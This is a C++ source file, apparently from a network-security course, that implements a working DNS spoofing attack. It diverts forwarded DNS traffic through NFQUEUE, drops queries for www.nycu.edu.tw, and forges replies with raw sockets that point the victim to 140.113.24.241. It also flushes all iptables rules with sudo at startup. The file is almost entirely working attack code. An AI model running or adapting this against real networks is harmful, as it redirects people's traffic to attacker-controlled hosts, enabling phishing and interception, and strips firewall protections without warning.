#include <iostream>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>

#define DNS_PORT 53
#define FAKE_IP "140.113.24.241"

using namespace std;

uint16_t checksum(void* b, int len) {
    uint16_t* buf = static_cast<uint16_t*>(b);
    uint32_t sum = 0;
    uint16_t result;

    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(uint8_t*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

bool match_query(const uint8_t* query) {
    return memcmp(query + 1, "www", 3) == 0 &&
           memcmp(query + 5, "nycu", 4) == 0 &&
           memcmp(query + 10, "edu", 3) == 0 &&
           memcmp(query + 14, "tw", 2) == 0;
}

int send_fake_response(const uint8_t* original_payload, const iphdr* ip, const udphdr* udp, const uint8_t* dns_query, int dns_len, const uint8_t* dns_id, const uint8_t* dns_type) {
    uint8_t response[512]{};
    iphdr* ip_resp = reinterpret_cast<iphdr*>(response);
    udphdr* udp_resp = reinterpret_cast<udphdr*>(response + sizeof(iphdr));
    uint8_t* dns_response = response + sizeof(iphdr) + sizeof(udphdr);
    int total_len = 0;

    // Set IP header
    ip_resp->ihl = 5;
    ip_resp->version = 4;
    ip_resp->tos = 0;
    ip_resp->id = 0;
    ip_resp->frag_off = 0;
    ip_resp->ttl = 64;
    ip_resp->protocol = IPPROTO_UDP;
    ip_resp->saddr = ip->daddr;
    ip_resp->daddr = ip->saddr;

    // Set UDP header
    udp_resp->source = udp->dest;
    udp_resp->dest = udp->source;
    udp_resp->check = 0;

    // DNS response
    if (dns_type[1] == 0x41) {
        uint8_t tmp[] = {
            dns_id[0], dns_id[1], 0x81, 0xa0, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x01, 0x00, 0x01
        };
        uint8_t tmp2[] = {
            0xc0, 0x11, 0x00, 0x06, 0x00, 0x01, 0x00, 0x00, 0x05, 0x0a,
            0x00, 0x21, 0x03, 0x64, 0x6e, 0x73, 0xc0, 0x11, 0x04, 0x72,
            0x6f, 0x6f, 0x74, 0xc0, 0x11, 0x78, 0xb3, 0xa9, 0xad, 0x00,
            0x01, 0x51, 0x80, 0x00, 0x00, 0x07, 0x08, 0x00, 0x09, 0x3a,
            0x80, 0x00, 0x00, 0x1c, 0x20, 0x00, 0x00, 0x29, 0x02, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        memcpy(dns_response, tmp, sizeof(tmp));
        memcpy(dns_response + sizeof(tmp), dns_query, dns_len);
        memcpy(dns_response + sizeof(tmp) + dns_len, tmp2, sizeof(tmp2));

        total_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(tmp) + dns_len + sizeof(tmp2);
    }
    else if (dns_type[1] == 0x01) {
        uint8_t tmp[] = {
            dns_id[0], dns_id[1], 0x81, 0x80, 0x00, 0x01, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00
        };
        uint8_t tmp2[] = {
            0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3c,
            0x00, 0x04, 140, 113, 24, 241,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        memcpy(dns_response, tmp, sizeof(tmp));
        memcpy(dns_response + sizeof(tmp), dns_query, dns_len);
        memcpy(dns_response + sizeof(tmp) + dns_len, tmp2, sizeof(tmp2));

        total_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(tmp) + dns_len + sizeof(tmp2);
    }

    ip_resp->tot_len = htons(total_len);
    ip_resp->check = checksum(ip_resp, sizeof(iphdr));

    udp_resp->len = htons(total_len - sizeof(iphdr));
    udp_resp->check = checksum(udp_resp, sizeof(udphdr));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    sockaddr_in to{};
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = ip_resp->daddr;

    if (sendto(sock, response, total_len, 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
        perror("sendto");
    } else {
        cout << "[>] Sent spoofed DNS reply to victim." << endl;
    }
    // sendto(sock, response, total_len, 0, reinterpret_cast<sockaddr*>(&to), sizeof(to));
    close(sock);
    return 0;
}

static int cb(struct nfq_q_handle* qh, nfgenmsg* nfmsg,
              nfq_data* nfa, void* data) {
    nfqnl_msg_packet_hdr* ph = nfq_get_msg_packet_hdr(nfa);
    int id = ph ? ntohl(ph->packet_id) : 0;

    uint8_t* payload = nullptr;
    int len = nfq_get_payload(nfa, &payload);
    if (len >= 0) {
        iphdr* ip = reinterpret_cast<iphdr*>(payload);

        if (ip->protocol == IPPROTO_UDP) {
            udphdr* udp = reinterpret_cast<udphdr*>(payload + ip->ihl * 4);

            if (ntohs(udp->dest) == DNS_PORT) {
                uint8_t* dns_request = payload + ip->ihl * 4 + sizeof(udphdr);
                uint8_t additional[2];
                memcpy(additional, dns_request + 10, 2);
                int dns_len = ntohs(udp->len) - 20 - (int)(*additional) * 11;

                vector<uint8_t> dns_query(dns_request + 12, dns_request + 12 + dns_len);
                uint8_t dns_id[2];
                memcpy(dns_id, dns_request, 2);
                uint8_t dns_type[2];
                memcpy(dns_type, dns_request + 12 + dns_len - 4, 2);

                if (match_query(dns_query.data())) {
                    cout << ">> DNS Request Detected, Sending Fake Response" << endl;
                    send_fake_response(payload, ip, udp, dns_query.data(), dns_len, dns_id, dns_type);
                    return nfq_set_verdict(qh, id, NF_DROP, 0, nullptr);
                }
            }
        }
    }

    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, nullptr);
}

int main() {
    system("sudo iptables -F");
    system("sudo iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1");

    nfq_handle* h = nfq_open();
    if (!h) {
        cerr << "Error opening NFQUEUE" << endl;
        return EXIT_FAILURE;
    }

    nfq_unbind_pf(h, AF_INET);
    nfq_bind_pf(h, AF_INET);

    nfq_q_handle* qh = nfq_create_queue(h, 1, &cb, nullptr);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    int fd = nfq_fd(h);
    char buf[4096] __attribute__((aligned(4)));

    int rv;
    while ((rv = recv(fd, buf, sizeof(buf), 0)) >= 0) {
        nfq_handle_packet(h, buf, rv);
    }

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
